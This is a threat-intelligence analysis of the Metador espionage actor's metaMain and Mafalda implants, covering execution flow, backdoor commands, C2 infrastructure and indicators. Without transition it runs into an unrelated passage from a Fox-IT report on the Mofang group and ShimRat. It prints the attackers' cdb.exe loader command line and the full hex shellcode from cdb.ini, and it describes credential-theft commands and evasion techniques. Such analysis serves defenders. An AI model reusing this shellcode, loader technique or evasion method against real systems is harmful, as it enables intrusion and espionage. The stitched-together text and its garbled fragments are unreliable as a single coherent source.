Once on the target, the Metador operators can choose between multiple execution flows to load one or more of their modular frameworks. For example, the execution flow used on our Magnet of Threats combines a WMI persistence mechanism with an unusual LOLbin in order to kick off the decryption of a multi-mode implant we named ‘metaMain’ directly into memory. Even though metaMain is a fairly feature-rich backdoor, in this case the Metador operators used the metaMain implant to decrypt a subsequent modular framework called ‘Mafalda’ into memory. Mafalda is a flexible interactive implant, supporting over 60 commands. Mafalda appears to be a highly-valuable asset to the Metador operators, with newer variants exhibiting intense obfuscation making them extremely hard to analyze. Fig 1: Diagram of Metador’s multi-framework execution flow First, we discuss the execution flow (called ‘start_method’s by the developers) used on the original victim, followed by metaMain’s meta-mode functionality, and the Mafalda payload it loads.

We’ll delve into the Mafalda framework variants, primarily version 144 and a subsequent obfuscated build designed to attempt to counteract detection. Both of these platforms are extremely complex and support much greater functionality. For the sake of brevity, we have relegated additional configuration options, supported execution flows, unused command-and-control capabilities, port knocking sequences, and a myriad of intricacies to a Living Technical Appendix to facilitate further collaboration and accurate sharing. THE MANY SUPPORTED EXECUTION FLOWS OF METAMAIN metaMain is an implant framework used to maintain long-term access to compromised machines. It provides operators with extensive functionality, like keyboard and mouse event logging, screenshot theft, file download and upload, and the ability to execute arbitrary shellcode. The backdoor is keenly aware of its own execution context and runs in one of two modes as a result. The developers designate these modes by writing out either “I am meta” or “I am main” to a log.

We chose to name the platform ‘metaMain’ in reference to these two modes. metaMain supports multiple start_method’s (i.e., execution flows), with the backdoor’s operations differing slightly per method. The methods supported are CDB_DEBUGGER, HKCMD_SIDELOADING, and KL_INJECTED. In this section, we’ll focus on the CDB_DEBUGGER execution flow witnessed on our Magnet of Threats. Additional start methods, configuration artifacts, and supported commands are detailed in the metaMain section of the Technical Appendix. At the very initial stages of our investigation, we notified Kaspersky’s GReAT researchers about the Metador threat, suspecting that the KL_INJECTED start method might be a reference to abuse of their product. Although further analyses showed that this is not the case, GReAT researchers collaborated extensively with us, sharing both valuable expertise and telemetry. start_method: CDB_DEBUGGER As the name suggests, this execution scheme relies on CDB, the Microsoft Console Debugger, to carry out the execution process. Within this method, there are two possible variations based on whether the implant is invoked in meta- or main-mode.

We witnessed its use in meta-mode, turning the metaMain implant into a glorified loader for a Mafalda implant. In this case, metaMain’s persistence relies on the abuse of WMI Event Subscriptions. The operators register an event consumer named ‘hard_disk_stat’. Five to six minutes after booting up, the event triggers the execution of a LOLbin, cdb.exe. Fig 2: ‘hard_disk_stat’ event consumer Fig 3: WMI Event Subscription Although the advantages of using Microsoft’s Console Debugger to bypass native security solutions have been documented, its use is rarely observed in-the-wild. cdb.exe is not included with the Windows operating system by default. The threat actor has to bring their own copy to the target system. In this case, cdb.exe was dropped under C:\Windows\System32. On machines Metador operators chose not to persist on, cdb.exe was dropped, executed, and quickly removed.The attackers used the following command-line: The command line is long but consists of three arguments.

‘-cf cdb.ini’– A path to a debugging script. ‘c:\windows\system32\defrag.exe’– the debugged process. ‘-module fcache13.db’– An argument fed to the metaMain implant that points to a Mafalda payload. cdb.exe -cf c:\windows\system32\cdb.ini c:\windows\system32\defrag.exe -module fcache13.db Fig 4: The cdb.exe command line A debugging script, cdb.ini, is used to inject a small amount of shellcode into the debugged process in order to load metaMain. In most ITW cases, this process was ‘defrag.exe’. The entire content of cdb.ini is shown below: The convoluted script is simple in its structure: the debugger reads the following contents as quadword values (‘eq’), and runs those values at the entry point (‘$exentry’) of the debugged executable, then quits and detaches (‘qd’) itself. As expected, the quadword values translate into a shellcode snippet. eq $exentry F0E4834840EC8348 00006025248B4C65 8B4D1824648B4D00 4D24248B4D202464 24248B4D20247C8B 17A5BA2024648B4D 00F1E8E1894C7C00 44C748C931450000 44C7000000003024 8D48000000802824 0000BA000001330D 0003202444C78000 D0FF01418D450000 0FFFFD8349C58949 9BADBA0000009F84 00A9E8E1894CDF7D FFE9894CD2310000 AFCA54BAC68949D0 000092E8E1894C91 B841C931F7894C00 4404578D00001000 C08548D0FF40498D 6516BAC789496274 0069E8E1894C10FA 44C748F0894D0000 894C000000002024 370C8D4FE9894CFA 4C0FFD97FBBAD0FF 4C00000044E8E189 3546B848D0FFE989 894C62A83B9C4727 C1480630F1894CFE C9FF48C6FF480BC8 000400C78149F275 B5B983BAD7FF4100 00000AE8E1894C78 31C9FF48C9314800 8B41CB8949D0FFD2 008803848B453C43 508B45D8014D0000 DB014C20588B4118 8B42CAFF493CE367 FF3148DE014C9334 74C084ACFCC03148 F4EBC7010DCFC107 24588B41DC75D739 8B4266C931DB014C 014C1C588B41530C C3D8014C8B048BDB 6F646E69775C3A63 65747379735C7377 656570535C32336D 63656570535C6863 C30062642E323068 F77500C18349FD74 Fig 5: Shellcode contained in cdb.ini The shellcode reads, decrypts, and executes metaMain’s reflective DLL Loader from c:\windows\system32\Speech\Speech02.db.

The DLL’s sole purpose is to then read, decrypt, and load the metaMain orchestrator, stored as ‘Speech03.db’. When invoked in meta-mode, metaMain serves as a loader for the payload provided as an argument following “-module”. In this case, the file ‘fcache13.db’ is an encrypted Mafalda payload. Each of these payloads represents a valuable framework in its own right and will be detailed extensively in this report. In this meta-mode CDB_DEBUGGER execution scheme, establishing the command-and-control channel is deferred entirely to the Mafalda implant despite metaMain’s native capabilities. The CDB_DEBUGGER execution flow described above reflects the most common metaMain execution method we’ve observed in-the-wild. It’s also possible to have a main-mode CDB_DEBUGGER start method. We describe this, along with the HKCMD_SIDELOADING, and KL_INJECTED start_methods, in the metaMain section of the Technical Appendix. MAFALDA The Mafalda implant extends the backdoor functionalities that metaMain provides by implementing more than 50 backdoor commands, the majority of which can be configured by the operators.

We observed the implant referring to itself as Mafalda in its execution log. The name Mafalda may be inspired by an Argentinian cartoon character, massively popular with the hispanic diaspora as a means of political commentary since the 1960s. The Mafalda implant is an actively maintained, ongoing project. We observed two variants: A variant with a compilation timestamp of April 2021, which we refer to as ‘Mafalda Clear Build 144’. A variant with a compilation timestamp of December 2021, which we refer to as the newer Obfuscated Mafalda variant. The newer variant is an extension of the older variant with two major differences: The newer Mafalda variant extends the supported backdoor commands available to the operators from 54 to 67. The newer Mafalda variant is rife with anti-analysis techniques that make analysis extremely challenging. Metador appears to treasure Mafalda as an important asset worth protecting. Both Mafalda variants implement specific measures to remain undetected, including: Direct Windows system call execution– Mafalda supports what the implants internally refers to as naive and non-naive system call execution: Naive system calls are standard system call routines implemented in the ntdll.dll library.

Detection systems commonly monitor execution via naive system calls using hooks deployed in ntdll.dll. Non-naive system calls entail direct system call execution by invoking the syscall instruction itself. This is done to evade hooks of detection systems that may be deployed in ntdll.dll. Mafalda searches the file system and enumerates running processes for software that could detect or be used to analyze malware. Their list includes: Various Endpoint Detection and Response (EDR) systems. Analysis tools, such as IDA Pro, WinDbg, and x64dbg debuggers, Wireshark, and Sysinternals suite. Deletion of the Windows Event Log by invoking the OpenEventLogW and ClearEventLogW functions. In an interesting quirk, the Mafalda developers respond to the presence of IDA Pro or Binary Ninja with a comely “WTF?” and regard the presence of ‘msbuild.exe’ as indicating the presence of “Fellow Hackers”. Fig 6: Example of a Mafalda ‘non-naive syscall’  An additional notable quirk, if the name of the computer where the newer Mafalda Obfuscated Build executes is WIN-K4C3EKBSMMI, Mafalda prints debugger messages.

The debugger messages are encrypted, since, same as the execution log, Mafalda’s debugger messages are a source of information to analysts. WIN-K4C3EKBSMMI may indicate the name of the computer where the Metador developers were developing and/or testing Mafalda. Backdoor Commands Compared to the older Mafalda Build 144 variant, the newer Mafalda variant implements 13 additional backdoor commands, for a total 67 commands. This indicates that the Mafalda implant is a maintained, ongoing project. The figures below depict the functions in the older and the newer Mafalda variant that handle the processing of the different backdoor commands based on the command number. Fig 7: Encrypted debugger messages Fig 8: Older Mafalda variant: Processing of backdoor commands  Fig 9: Newer Mafalda variant: Processing of backdoor commands  The full unobfuscated list of commands, along with the developer’s descriptions, are available in the Mafalda section of the Technical Appendix. The following functionality is only available in the newer Mafalda variant: Network and system configuration reconnaissance.

Information theft and implant orchestration. Data decryption. Filesystem operations. The following is a summary of some of the newer Mafalda commands: Command 60 Reads the content of the file %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with ‘loot\’. The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cookies. The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\Users\test for the user test. Command 61 Decrypts attacker-provided data using the DPAPI (Data Protection Application Programming Interface) key of the platform where Mafalda runs. Mafalda sends the decrypted data to the C2 server as part of a packet with the name UnprotectData.out. For the decryption to succeed, the data has had to be encrypted on the machine where Mafalda runs and under the credentials of the user in whose context Mafalda runs.

Many applications protect sensitive data in this manner, such as browsers and email clients. Therefore, this decryption feature is useful for information theft. Command 55 Copies a file or directory from an attacker-provided source filesystem location to an attacker-provided destination filesystem location. If the destination location is a file that already exists, Mafalda overwrites the file. If the destination location is a directory, Mafalda places the file or the directory at the source location in the directory. This command supports wildcards if the destination location is a directory. If the attacker has provided a source location with a wildcard mask, Mafalda searches for files that match the wildcard mask and places the found files in the destination directory. Command 63 Conducts network and system configuration reconnaissance by executing: the GetAdaptersInfo function from the Windows iphlpapi library to retrieve information about the network adapters on the platform where Mafalda runs. Mafalda sends the retrieved information to the C2 server as part of a packet with the name misc/ ifconfig_Y_M_D_H_M_S, where Y_M_D_H_M_S is the date and time at the system where Mafalda runs at command execution.

the GetExtendedTcpTable function from the iphlpapi library to retrieve information about established TCP connections on the platform where Mafalda runs. Mafalda sends the retrieved information to the C2 server as part of a packet with the name misc/netstat_Y_M_D_H_M_S. The GetIpNetTable function from the iphlpapi library to retrieve the IPv4 to physical network address mapping table on the platform where Mafalda runs. Mafalda sends the retrieved information to the C2 server as part of a packet with the name misc/arp_Y_M_D_H_M_S. Command 67 Retrieves data from another implant that resides in the victim’s network and sends the data to the C2 server. We discuss this command in greater detail in the following section. ADDITIONAL IMPLANTS During our investigation, we came across indications of additional implants. Though we haven’t encountered the implants themselves, we detail what we know below in hopes of their future discovery. Cryshell Fig 10: Diagram of Metador’s multi-framework execution flow  The metaMain and Mafalda implants can establish an indirect connection to the C2 server through another implant, which metaMain and Mafalda internally refer to as Cryshell.

metaMain and Mafalda authenticate themselves to Cryshell through a port-knocking and handshake procedure. The port knocking procedure with which metaMain authenticates itself to Cryshell is similar to the one that Mafalda conducts. The Mafalda to Cryshell authentication procedure is detailed below: Mafalda sleeps 10 seconds. Mafalda connects to Cryshell using the hostname (or IP address) stored in the KNOCK_HOP1_IP Mafalda configuration variable and the following port numbers, with an interval of 200 ms after each connection: base_port, base_port+7, and base_port+3. base_port is the port number stored in the KNOCK_HOP1_ KNOCKBASE Mafalda configuration variable (31983 in the Mafalda sample that we analyzed). Mafalda sleeps 1 second. Mafalda connects to Cryshell using the hostname (or IP address) and the port number (31443 in the Mafalda sample that we analyzed), stored in the KNOCK_HOP1_IP and KNOCK_HOP1_ LISTENPORT Mafalda configuration variables, assuming that Cryshell now accepts connections at that port. Mafalda issues a data forwarding request to Cryshell and conducts the handshake procedure.

This enables the exchange of data with the C2 server by specifying the configured hostname (or IP address) and the port number of the C2 server (29029 in the Mafalda sample that we analyzed), stored in the KNOCK_FINALIP and KNOCK_FINALPORT Mafalda configuration variables. L i n u x I m p l a n t As mentioned in the description of command 67, the obfuscated Mafalda variant supports the retrieval of data from another implant that resides in the victim’s network and then sends the data retrieved to the C2 server as part of a packet with a name prefixed with ‘loot_linux\’. Based on these indications, we believe that Mafalda interacts with yet another implant to steal data from Linux systems. Though it’s possible that this unnamed Linux implant and Cryshell are the same, Mafalda authenticates itself to the Linux implant through a different port-knocking and handshake procedure. In summary, the port knocking procedure is as follows: Mafalda sleeps 2 seconds.

Mafalda connects to the Linux implant using an attacker-provided hostname, or IP address, and the following port numbers, with an interval of 100 ms between connections: base_port+5, base_port-8, and base_port+4, where base_port is an attacker-provided port number. Mafalda sleeps 500 ms. Mafalda connects to the Linux implant using the attacker-provided hostname (IP address) and the base_port port number, assuming that the Linux implant now accepts connections at that port. Mafalda follows up the port knocking procedure with a handshake: Mafalda generates a random 16 byte value, sends the value to the Linux implant, and receives another 16 byte value back. Mafalda and the Linux implant use these values to initialize RC4 contexts for exchanging RC4-encrypted data. Mafalda sends RC4-encrypted data to the Linux implant and receives RC4-encrypted data back. If the data that Mafalda has sent is equal to the data that Mafalda has received, the handshake procedure is considered complete.

After Mafalda has successfully authenticated itself to the Linux implant, the Linux implant sends data to Mafalda, which Mafalda subsequently sends to the C2 server. INFRASTRUCTURE Being a highly OPSEC aware actor, Metador manages their infrastructure rather carefully. Throughout the analysis of Metador infrastructure, much like its implants, we found no obvious overlaps with previously reported actors. In all Metador intrusions we’ve observed so far, the operators use a single external IP address per victim network at a time. That IP is utilized for command-and-control over either HTTP (metaMain, Mafalda) or raw TCP (Mafalda). In all confirmed instances, the servers were hosted on LITESERVER, a Dutch hosting provider. As indicated by Metador HTTP server headers, it appears that at least some of the infrastructure is managed in Python: Interestingly enough, C2 server 5.2.77[.]52 linked to the older Mafalda Build 144. The first seen response (shown above) is issued April 19, 2021 while the relevant Mafalda build was compiled on April 26th, one week after the first deployment of the HTTP command-and-control application.

It suggests that this server was prepared specifically for this operation. Another confirmed C2 server, 5.2.64[.]74, found embedded in newer versions of Mafalda does not match a similar behavior pattern, and was first observed serving a similar response in June of 2021, while the samples date to December. In addition to HTTP, external Mafalda C2 servers also support raw TCP connections over port 29029, as seen in newer Mafalda versions. This port was also exposed to the internet, and utilizing Mafaldas unique handshake it was also reachable. No additional servers were found hosting a similar application over the same port, which might as well be an indication that the threat actor allocates it randomly per victim. HTTP/1.0 404 Not Found Server: BaseHTTP/0.6 Python/3.6.9 Date: Mon, 19 Apr 2021 16:48:35 GMT Content-type: text/plain 5.2.77[.]52 C2 HTTP example server response  SSH In addition to those, we also observed some of Metador’s infrastructure host an SSH server at an unusual port.

While SSH is commonly used for remote access to *nix systems, we find it hard to believe that a mature threat actor would expose their infrastructure in such a way. Instead, it’s likely those were used to tunnel traffic through Mafalda’s internal portfwd commands. As internally documented, this server is “usually where tcpserver.py runs” (Another indication of usage of Python as C2 infrastructure). Funnily enough, the developers left a comment for this function, to make sure the used user is not privileged over the server. Additional Servers Pivoting some of those traits, we were able to identify one additional server we believe is operated by Metador actors, also hosted on Liteserver - 5.2.78[.]14. Much like others, it hosts a Python HTTP server and has SSH open over a high port. We were not able to verify the integrity of this server. Fig 11: Mafalda enables forwarding of tcp connections over SSH connection to an external server.

Fig 12: networkselfhelp[.]com original whois record  Interestingly enough, this IP hosts what appears to be a malicious domain, `networkselfhelp[.] com`, that might have been used as a C2 for Metador intrusions. If this is indeed the case, it’s an indications Metador operators not only utilize IPs for their intrusions, but also domains. The domain was registered on November 27, 2020, and was renewed once since. ATTRIBUTION AND TIMELINE The metaMain samples we observed in our investigations recorded a timestamp of Dec 29 2020 06:37:27 in their execution log. This is our earliest indication of an infection date before our deployment and obviously entails that the malware had to be compiled prior. The Metador teams are highly OpSec aware. They manage their operations and infrastructure carefully. While they didn’t leave any obvious attribution references, there are some noteworthy indicators of the kind of folks involved strewn across some of the components.

These don’t come anywhere close to painting an exhaustive picture of the threat actor or any organization involved. The limited number of intrusions and long-term access to targets suggests that the threat actor’s primary motive is espionage. Moreover, the technical complexity of the malware utilized and its continuous active development suggests a well-resourced group, not only in a position to acquire multiple frameworks but also maintain and develop them further. Internal comments support that claim, as the developers provide guidance for a separate group of operators. Metador was observed in a very limited number of targets, mainly Telecoms, Internet Service Providers (ISP), and Universities in the Middle East and Africa. ISPs are increasingly common targets for state-sponsored intrusions, as they not only contain sensitive information but can serve as enablers of expanded collection and tracking capabilities. What we witnessed are operations intended to provide long-term access in multiple redundant ways, rather than shortterm, smash-and-grab ops.

As components of the malware frameworks are well documented, we can analyze some of the language used by the developers. It’s evident that some Metador developers are fluent in English. They even display different idiosyncrasies, with one writing in a more informal English with LOLs and smiley faces, and another displaying traits of a more highfalutin English language. Some of the internal terminology is also interesting, referring to the malware as an ‘implant’ for example. We don’t believe that the whole team is native English speaking. On the contrary, we also came across indications of usage of Spanish throughout the code of Mafalda. The name alone is likely a reference to a beloved Argentinian cartoon strip of the same name. The Mafalda cartoon was a vehicle for progressive, middle-class political messaging as early as the 1960s, invoking child-like innocence to express for humanity. As referenced in the Mafalda breakdown, when receiving an empty C2 response, Mafalda expects the answer “nada”, meaning “nothing” in Spanish.

Another notable cultural reference, also found within Mafalda’s code, is a string resource left by the developers: “her eyes were cobalt red, her voice was cobalt blue”. This is a quote from the 90s song “Ribbons” by British pop punk band The Sisters of Mercy. Fig 13: Mafalda cartoon, translates to “Beware! Irresponsible people working”. Fig 14: Lyrics of the song “Ribbons” by The Sisters of Mercy as Mafalda string resources  Whilst these cultural references are interesting fingerprints, they do not lend themselves to a clear sense of attribution nor a cohesive attributory narrative beyond the possibility of a diverse set of developers perhaps indicative of a contractor arrangement. The Mafalda internal version logging prints out the following string for Mafalda build 144: “Mafalda build 144, compiled 2021_04_26__14_36_47”. Analyzing the binary, however, reveals the DLL export timestamp is 2021-04-26 13:37:05 UTC, suggesting the machine Mafalda was compiled on was in the timezone UTC+1 in April of 2021.

metaMain and Mafalda activity observed in-the-wild is very limited, and was mostly around 11:00-14:00 UTC. The time that these operations were carried out could also correspond to the local timezone of the target in order to blend in with the target network’s baseline activities. Mafalda internal commands documentation suggests the implant is being maintained and developed by a dedicated team, leaving comments for a separate group of operators. In the comment below, left in the ‘portfwd_connect’ command, a note was left, verifying the operator doesn’t do “anything stupid”. In other comments, ‘upload’ and ‘download’, a clear reference to “operators” machines is listed, suggesting there is a separation between operators and developers. It’s also worth noting that some of the command documentation makes references to both Metasploit and Cobalt Strike, which suggests that Metador may rely on these commonly abused pentesting suites for other aspects of their operations. Fig 11: Developer documentation formatted to display via a ‘Mafalda cli simulator’  CONCLUSION Running into Metador is a daunting reminder that a different class of threat actors continues to operate in the shadows with impunity.

Previous threat intelligence discoveries have broadened our understanding of the kind of threats that are out there but so far, our collective ability to track these actors remains inconsistent at best. Developers of security products in particular should take this as an opportunity to proactively engineer their solutions towards monitoring for the most cunning, well-resourced threat actors. High-end threat actors are thriving in a market that primarily rewards compliance and perfunctory detections. From the perspective of the threat intelligence research community, we are deeply grateful for the contributions of the research teams and service providers who have willingly shared their expertise and telemetry for this research. We hope that this publication will incentivize further collaboration and provide us with answers to the mystery of Metador. APPENDIX: INDICATORS OF COMPROMISE For a more extensive breakdown and in-depth reverse engineering of each component as well as updated indicators of compromise, please refer to the living Technical Appendix.

C&C servers Description File Path Sha1 metaMain CDB Injector cdb.ini 9fc7df2b2539ec3abeb90848903ad608a1101345 metaMain DLL Loader speech02.db e7f68dc6b8e4cabe5773a5b0b2306a404706de48 metaMain Orchestrator speech03.db 0397b92bd8606e2b11ec6518c2df43decaf02382 Mafalda v. 143 Mode 0 - Over TCP fcache11.db 0f021a6c32f4d9053a9d8fb36749f8c434376fd1 Mafalda v. 143 Mode 2 - Over HTTP fcache13.db fdec8be5d5f2693fbfa36fdf38aa8f9932c6a34a Mafalda v.144 (Obfuscated) Mode 0 - Over TCP fcache11.db 00f2176edb17d970005fc70a66ecc587a84f8620 Mafalda v.144 (Obfuscated) Mode 2 - Over HTTP fcache13.db 3e2724b9a8ecf05661d91b02accdc1da7e43d513 Mafalda v.144 (Obfuscated) Mode 3 - Over pipes fcache14.db b5d35c1e75330c0b26ebbd562191beb7f03d726b IP Confidence 5.2.64[.]74 High 5.2.77[.]52 High 5.2.78[.]14 High networkselfhelp[.]com Suspected Files Loading files and Mafalda are stored directly under c:\windows\system32, while metaMain components are stored in a subfolder, ‘Speech’, with corresponding names. InfoSec works on a rapid iterative cycle where new discoveries occur daily and authoritative sources are easily drowned in the noise of partial information. SentinelLabs is an open venue for our threat researchers and vetted contributors to reliably share their latest findings with a wider community of defenders.

No sales pitches, no nonsense. We are hunters, reversers, exploit developers, and tinkerers shedding light on the world of malware, exploits, APTs, and cybercrime across all platforms. SentinelLabs embodies our commitment to sharing openly –providing tools, context, and insights to strengthen our collective mission of a safer digital life for all. ABOUT SENTINELLABS

Lead Author: Yonathan Klijnsma Co-authors: Danny Heppener, Mitchel Sahertian, Krijn de Mik, Maarten van Dantzig, Yun Zheng Hu, Lennart Haagsma, Martin van Hensbergen, Erik de Jong Version 1.0 May 17, 2016 Mofang A politically motivated information stealing adversary | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 It is highly likely that Mofang’s targets are selected based on involvement with investments, or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is most clearly the case in a campaign focusing on government and critical infrastructure of Myanmar that is described in this report. Chances are about even, though, that Mofang is a relevant threat actor to any organization that invests in Myanmar or is otherwise politically involved. In addition to the campaign in Myanmar, Mofang has been observed to attack targets across multiple sectors (government, military, critical infrastructure and the automotive and weapon industries) in multiple countries.

The following countries have, in the above named sectors, been affected, although Fox-IT suspects there to be more: India, Germany, United States, Canada, Singapore, South Korea. Despite its diverse set of targets Mofang is probably one group. This is based on the fact that its tools (ShimRat and ShimRatReporter) are not widely used, and that campaigns are not usually observed in parallel. Technically, the group uses distinct tools that date back to at least February 2012: ShimRat and ShimRatReporter. The mofang group does not use exploits to infect targets, they rely on social engineering and their attacks are carried out in three stages: 1 Compromise for reconnaissance, aiming to extract key information about the target infrastructure. 2 Faux infrastructure setup, designed to avoid attracting attention. 3 The main compromise, to carry out actions on the objective. The name ShimRat is based on how its persistence is build up. It uses the so-called shims in Windows to become persistent.

Shims are simply hot patching processes on the fly, to ensure backward compatibility of software on the Microsoft Windows platform. Mofang (模仿, Mófa ng, to imitate) is a threat actor that almost certainly ̌ operates out of China and is probably government-affiliated. Executive Summary  As far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. The only exploits the group uses are privilege elevation exploits built into their own malware. The vulnerabilities that were being exploited were already known about at the time of use. The full report contains contextual as well as technical information about the group and its activities. These can be used, for example, for threat assessments, compromise assessments, incident response and forensics activities. Should you have any additional information or questions about this group or its activities, please get in touch with Fox-IT through info@fox-it.com.

Table of Contents Executive Summary 2  Imitation, in this case imitation of a target’s infrastructure, is a defining feature of their modus operandi. This threat report gives insight into some of the information that Fox-IT has about a threat actor that it follows, called Mofang. The name Mofang is based on the Mandarin verb 模仿 (Mófa ̌ng), which means to imitate. Imitation, in this case imitation of a target’s infrastructure, is a defining feature of their modus operandi. It is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated. Among others, one of their focus areas is the government and critical infrastructure sector of Myanmar. Additional information was used to contextualize and explain the observed attacks and campaigns, since there is obviously no easy insight in their actual agenda and goals. The additional research into geopolitical and economic factors resulted in the hypotheses about the ‘why’ of these campaigns.

The full picture, however, will probably remain unknown. Fox-IT has chosen to release this report now, for additional context to the changing political landscape in Myanmar. This report contains contextual as well as technical information about the group and its activities. These can be used, for example, for threat assessments, compromise assessments, incident response and forensics activities. Should you have any additional information or questions about this group or its activities, please get in touch with Fox-IT through info@fox-it.com. Chapter 2 through 6 deals with Mofang, the group, its targets and some of their most notable campaigns and attacks. These chapters also contain geopolitical and economic context. Chapter 7 explains the working of Mofang’s preferred tools: ShimRat and SimRatReporter. The final two chapters of this report, chapter 8 and 9, provide technical Indicators of Compromise for use in detecting and hunting, both at a host and at a network level.

2.1 About the Mofang group Despite its diverse set of targets (described in paragraph 2.2), Mofang is probably one group. This is based on the fact that its tools (ShimRat and ShimRatReporter) are not widely used, and that campaigns are not usually observed in parallel. Based on a numbers of factors that will be explained in more detail in this Chapter, it is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated. The most compelling evidence that supports this hypothesis is the fact that the targets and campaigns known so far can be persuasively correlated to important geopolitical events and investment opportunities that align with Chinese interests. The most notable of these will be described in chapter 5, which describes systematic espionage in the government and critical infrastructure sector of Myanmar. It describes: Companies that are involved with investment possibilities that also involve Chinese state owned organizations, become targets; Government agencies or companies that play a role in deciding about Chinese investments, become targets; In addition to the above, there are four notable technical facts.

Details such as these can, of course, be changed and manipulated without material impact to attacks, which makes them weaker indicators of attribution than contextual evidence derived from likely campaign goals. In this case, the technical facts support the hypothesis for attribution. 2 Who is Mofang and who do they attack? Based on a numbers of factors that will be explained in more detail in this Chapter, it is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated. 1 There are many similarities at the code level between the stager used by Mofang and others stagers attributed to Chinese groups. Also striking is the method of hijacking Antivirus Products to run the malware, which Fox-IT calls ShimRat, as described in chapter chapter 7.1. This has been seen in multiple espionage campaigns attributed to Chinese groups. In fact the similarities are so strong that some investigators have mistaken ShimRat to be another widely known piece of malware: PlugX.

Based on in-depth investigation of both, Fox-IT has come to the conclusion that they are not the same. ShimRat is probably t is used by a separate group. 2 All the documents that were used for the initial attacks contain metadata that suggests they were created with WPS Office. This product, also known as Kingsoft Office, is a Chinese product comparable to Microsoft Office. Artifacts can be seen in document metadata as shown in Figure 1. 3 Simplified Chinese is set as the character set in many of the resources inside various malware samples, as shown in Figure 2. Figure 1 detail of decoy document metadata Figure 2 Resource information inside a malware sample 8 | fox-it | Mofang | A politically motivated information stealing adversary | May 2016 Figure 3 郁, 郁! used in the 1991 Hong Kong comedy Tricky Brains 4 An earlier version of ShimRat’s C2 communication protocol used two very specific words as keywords for requests and responses: Yuok and Yerr.

Although the meaning is not directly obvious, it may be an approximate phonetic representation of the Cantonese 郁 佢, beat him or kill him. If this is true, it would suggest at least passive knowledge of Cantonese on the part of the malware author. The use of Yuok and Yerr was discontinued and replaced by ataD or Data in 2013, as shown in the side by side comparison in Figure 4. The current communication protocol is documented in paragraph 7.1.6. Figure 4 Side by side comparison of previous and current C2 communication  Figure 5 Countries and sectors targeted by Mofang 2.2 Mofang’s targets: a diverse set of entities On analysis of the organizations that were attacked by Mofang in the past, at first glance it appears that there is no particular sector or country that it targets. Figure 5 shows aggregate information about known attacks from the past four years.

Looking at the attacks, it is highly likely that targets are selected based on involvement with investments, or technological advances that could be perceived as a threat to the Chinese sphere of influence. This is most clearly the case in the campaign focusing on Myanmar. In it, a company was attacked that was involved in a special economic zone1 in Myanmar, which would be of specific interest to China’s National Petroleum Corporation’s investments. It is highly likely that they were targeted because of this, as new waves of attacks can be correlated with events surrounding the investments in that area. 1 Special economic zones, of which Myanmar currently has three, are specific areas within a country where certain laws and regulations are different from the rest of the country, usually with the aim of furthering the ‘host’ country’s economy. Government Military Critical Infrastructure Automotive Industry* Weapon Industry* *R&D departments specically Germany South Korea Singapore India Myanmar United States Canada  The Mofang group uses distinct malware that dates back to at least February 2012.

The two tools used in their campaigns are: 1 ShimRat 2 ShimRatReporter As far as known, the Mofang group has never used exploits to infect targets, instead relying heavily on social engineering in order to successfully infect targets. The only exploits the group uses are privilege elevation exploits built into their own malware. The vulnerabilities that were being exploited were already known about at the time of use. A more detailed description of the malware can be found in paragraph 7.1 and 7.2. The Mofang group has a distinct method of carrying out attacks using these two tools, with the goal of stealing information. In short, their method, which is described below, can be summarized as follows: 1 Initial reconnoitering compromise: an initial compromise is performed on specific employees of a targeted organization with the aim of extracting key information about the target infrastructure to be used in stage 2; 2 Faux infrastructure setup: the group sets up (external) infrastructure designed to avoid attracting attention; 3 The main compromise.

3.1 Stage 1: Initial reconnoitering compromise For the initial compromise, an ‘environment mapping tool’ known as ShimRatReporter, is delivered to suitable targets. ShimRatReporter can extract a wealth of information about an infrastructure, but the most pertinent data needed for the next stage in their attack are: Local privileges for the infected user; Local domain; Local proxy setup; Installed software. ShimRatReporter is fully explained in chapter 7.2. The delivery method of ShimRatReporter is most likely through emails pointing to an executable placed on a compromised (and trusted) website. Fox-IT has observed targeted and untargeted variations of the initial stage of the attack: 1 Untargeted: the ShimRatReporter sends out the report with the information and immediately downloads the ShimRat malware from a hardcoded location. This variation is probably less targeted, with victims added to the global campaign C2 for check-in and control. For more information about the global campaign, see paragraph 6.4.

2 Targeted: the ShimRatReporter sends out the report and exits afterwards. The ShimRatReporter tool was only used to map out the victim but in no way to automate further infection (yet). 3 The distinct modus operandi of Mofang Operators Target organization Target gathering information gathering information Setting up the infrastructure Setting up the customized infrastructure Spear phishing attack with ShimRatReporter The main attack with a customized ShimRat version The main attack with ShimRat information Victim’s PCs and servers with classied information control Targeted campaign Global campaign Modus operandi of the Mofang group 3.2 Stage 2: Faux infrastructure setup The second stage of an attack is setting up a faux infrastructure, specifically to mimic the anti-virus products used by the target or the target itself. The ShimRat malware then communicates over HTTP with preconfigured command and control servers. A combination of typo-squatting and closely related names are used to register domains under the same or different tlds.

This method of setting up command and control infrastructure is customized for each target and campaign. Anything outside of campaigns targeting specific companies is added to the ‘global campaign’ which is described in paragraph 6.4. The global campaign infrastructure mimics the Microsoft Windows or Microsoft Office software. 3.3 Stage 3: The main compromise After having gathered all necessary information about the locally configured proxies and having set up a faux infrastructure, a custom built version of the ShimRat malware will be deployed to infect users with preconfigured local proxies, C2 servers and persistence information. As mentioned before, delivery of ShimRat relies heavily on social engineering, through the use of emails enticing targets to open an attached (decoy) document. These documents contain actual text to make the target think it was indeed a legitimate Word document, pdf file or Excel sheet. When the document is opened, an executable is dropped which decompresses the final payload and places it on disk.

The final payload consists of ShimRat bundled with extra files: legitimate application files which suffer from dll hijacking vulnerabilities. These vulnerabilities are used to launch the actual malware. The legitimate application is started which in turn runs the actual malware. A benefit of this method is that the malware runs under the process of a legitimate application. When it requests higher privileges via uac, the uac warning screen will show this legitimate application. Also, anyone inspecting running applications, would see legitimate software running. It is worthy to note that the Mofang group commonly exploits dll hijacking vulnerabilities in anti-virus products for persistence purposes, presumably in order to look as harmless as possible. Over the years they’ve used application components from Norman, McAfee and Norton. A complete list of the used applications can be found in paragraph 9.4. The methods of persistence (described in paragraph 7.1.1) are sometimes adapted depending on the target.

